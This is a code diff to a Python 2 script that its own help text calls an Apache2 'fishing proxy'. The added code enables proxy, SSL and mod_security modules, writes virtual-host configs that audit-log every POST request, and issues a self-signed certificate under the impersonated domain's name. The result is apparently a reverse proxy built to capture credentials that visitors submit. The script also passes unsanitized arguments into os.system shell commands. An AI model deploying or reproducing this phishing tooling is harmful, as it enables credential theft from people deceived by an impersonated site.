@@ -49,11 +49,61 @@ class Base:
     def check_file_exist(file_name):
         return os.path.isfile(file_name)
 
+    def check_apache2(self):
+        if not self.check_file_exist("/etc/init.d/apache2"):
+            print self.c_error + "Apache2 init script (/etc/init.d/apache2) not found!"
+            exit(1)
+
+    def check_available_modules(self):
+        if not self.check_file_exist("/etc/apache2/mods-available/proxy.load"):
+            print self.c_error + "Apache2 module: mod_proxy not installed!"
+            exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/proxy_http.load"):
+            print self.c_error + "Apache2 module: mod_proxy_http not installed!"
+            exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/proxy_ajp.load"):
+            print self.c_error + "Apache2 module: mod_proxy_ajp not installed!"
+            exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/security2.load"):
+            print self.c_error + "Apache2 module: mod_security2 not installed!"
+            print self.c_info + "Install: apt install libapache2-mod-security2"
+            exit(1)
+        if not self.check_file_exist("/etc/apache2/mods-available/ssl.load"):
+            print self.c_error + "Apache2 module: mod_ssl not installed!"
+            exit(1)
+
+    def check_enabled_modules(self):
+        if not self.check_file_exist("/etc/apache2/mods-enabled/proxy.load"):
+            print self.c_error + "Apache2 module: mod_proxy not enabled!"
+            print self.c_info + "Enable: a2enmod proxy"
+            os.system("a2enmod proxy > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/proxy_http.load"):
+            print self.c_error + "Apache2 module: mod_proxy_http not enabled!"
+            print self.c_info + "Enable: a2enmod proxy_http"
+            os.system("a2enmod proxy_http > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/proxy_ajp.load"):
+            print self.c_error + "Apache2 module: mod_proxy_ajp not enabled!"
+            print self.c_info + "Enable: a2enmod proxy_ajp"
+            os.system("a2enmod proxy_ajp > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/security2.load"):
+            print self.c_error + "Apache2 module: mod_security2 not enabled!"
+            print self.c_info + "Enable: a2enmod security2"
+            os.system("a2enmod security2 > /dev/null 2>&1")
+        if not self.check_file_exist("/etc/apache2/mods-enabled/ssl.load"):
+            print self.c_error + "Apache2 module: mod_ssl not enabled!"
+            print self.c_info + "Enable: a2enmod ssl"
+            os.system("a2enmod ssl > /dev/null 2>&1")
+
 
 if __name__ == "__main__":
     Base = Base()
+
     Base.check_user()
     Base.check_platform()
+
+    Base.check_apache2()
+    Base.check_available_modules()
+    Base.check_enabled_modules()
 
     parser = ArgumentParser(description='Setup Apache2 fishing proxy')
     parser.add_argument('-u', '--url', type=str, help='Set URL for proxy', default='http://test.com')
@@ -74,7 +124,17 @@ if __name__ == "__main__":
                         help='Set path to Apache2 https site config '
                              '(default: /etc/apache2/sites-available/default-ssl.conf)',
                         default='/etc/apache2/sites-available/default-ssl.conf')
+    parser.add_argument('-E', '--erase', action='store_true', help='Erase Apache2 config files')
     args = parser.parse_args()
+
+    if args.erase:
+        open(args.http_config, 'w').close()
+        open(args.https_config, 'w').close()
+        print Base.c_info + "Apache2 http sites config: " + args.http_config
+        print Base.c_info + "Apache2 https sites config: " + args.https_config
+        print Base.c_info + "Apache2 configuration files have been erased!"
+        os.system("/etc/init.d/apache2 stop")
+        exit(0)
 
     schema = "http"
     domain = "test.com"
@@ -115,13 +175,13 @@ if __name__ == "__main__":
                                    "\n\tSecDefaultAction \"nolog,noauditlog,allow,phase:2\"" +
                                    "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
                                    "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"" +
-                                   "\n</VirtualHost>")
+                                   "\n</VirtualHost>\n")
 
     if schema == "https":
-        print Base.c_info + "Create SSL cert and key"
-        os.system("openssl req -nodes -new -x509 -days 365 -keyout " + domain + ".key -out " + domain + ".pem " +
-                  "-subj '/C=" + args.country + "/ST=" + args.state + "/L=" + args.locality +
-                  "/O=" + args.organization + "/OU=" + args.organization_unit + "/CN=" + domain + "'")
+        print Base.c_info + "Create SSL cert and key ..."
+        os.system("openssl req -nodes -newkey rsa:4096 -x509 -days 365 -keyout " + domain + ".key -out " + domain +
+                  ".pem " + "-subj '/C=" + args.country + "/ST=" + args.state + "/L=" + args.locality +
+                  "/O=" + args.organization + "/OU=" + args.organization_unit + "/CN=" + domain + "' > /dev/null 2>&1")
         os.system("mv " + domain + ".pem /etc/ssl/certs/")
         os.system("mv " + domain + ".key /etc/ssl/private/")
         os.system("chmod 0600 /etc/ssl/private/" + domain + ".key")
@@ -151,7 +211,7 @@ if __name__ == "__main__":
                                    "\n\tSecRule REQUEST_METHOD \"^POST$\" \"chain,allow,phase:2,id:123\"" +
                                    "\n\tSecRule REQUEST_URI \".*\" \"auditlog\"" +
                                    "\n\tSSLProxyEngine On" +
-                                   "\n</VirtualHost>")
+                                   "\n</VirtualHost>\n")
 
         with open(args.https_config, "a") as https_config_file:
             https_config_file.write("\n\n<IfModule mod_ssl.c>" +
@@ -175,7 +235,18 @@ if __name__ == "__main__":
                                     "\n\t\tSSLCertificateFile /etc/ssl/certs/" + domain + ".pem" +
                                     "\n\t\tSSLCertificateKeyFile /etc/ssl/private/" + domain + ".key" +
                                     "\n\t</VirtualHost>" +
-                                    "\n</IfModule>")
+                                    "\n</IfModule>\n")
 
     print Base.c_info + "Restart Apache2 server"
     os.system("/etc/init.d/apache2 restart")
+
+    with open(args.http_config, "r") as http_config_file:
+        print Base.c_info + "Config: " + args.http_config + ": "
+        print http_config_file.read()
+
+    with open(args.https_config, "r") as https_config_file:
+        print Base.c_info + "Config: " + args.https_config + ": "
+        print https_config_file.read()
+
+    print Base.c_info + "Apache2 http sites config: " + args.http_config
+    print Base.c_info + "Apache2 https sites config: " + args.https_config
